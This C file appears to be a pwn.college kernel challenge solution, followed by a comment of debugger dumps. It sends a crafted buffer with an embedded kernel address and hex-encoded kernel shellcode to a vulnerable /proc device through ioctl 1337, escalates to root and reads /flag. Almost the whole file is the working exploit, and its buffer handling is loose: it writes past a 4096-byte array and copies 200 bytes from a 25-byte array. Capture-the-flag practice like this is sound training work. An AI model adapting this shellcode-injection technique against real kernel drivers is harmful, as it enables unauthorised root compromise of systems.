#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdio.h>
int main(){
    int fd = open("/proc/pwncollege", O_WRONLY);
    char buff[4096];
    char kshellcode[] = "\x48\x31\xff\x48\xc7\xc0\xd0\x90\x08\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
    char length[] = "\x00\x0f\x00\x00\x00\x00\x00\x00";
    char address[] = "\x00\x50\x08\x00\x00\xc9\xff\xff";
    //char address[] = "\xff\xff\xc9\x00\x00\x08\x50\x00";
    //printf("%ld:   \n",strlen(kshellcode));
    //printf("%d:   \n",(int)strlen("\xff\xff\xc9\x00\x00\x08\x50\x00"));
    //memcpy(buff, "0x1000", 8);
    //printf("%c\n", shellcode_len[0]);
    //printf("%c\n", shellcode_len[1]);
    memcpy(buff, length, 8);
    memcpy(buff+4104, address, 8);
    memcpy(buff+8, kshellcode , 200);

    ioctl(fd, 1337, buff);
    int fd1 = open("/flag", O_RDONLY);
    sendfile(1,fd1, 0, 70);
}

/*
arg[0]: 0xffffc9000013fe38 --> 0x382 
arg[1]: 0x7ffed6e67190 --> 0xf00 
arg[2]: 0x8 

-----------------

arg[0]: 0xffffc9000013fe40 --> 0xffffc9000013fe50 --> 0xffff88807c777100 --> 0x0 
arg[1]: 0x7ffed6e68198 --> 0xffffc90000085000 --> 0x90d0c0c748ff3148 
arg[2]: 0x8 

-----------------

arg[0]: 0xffffc90000085000 --> 0x90d0c0c748ff3148 
arg[1]: 0x7ffed6e67198 --> 0x90d0c0c748ff3148 
arg[2]: 0xf00 

0xffffffff81e00ea0

*/
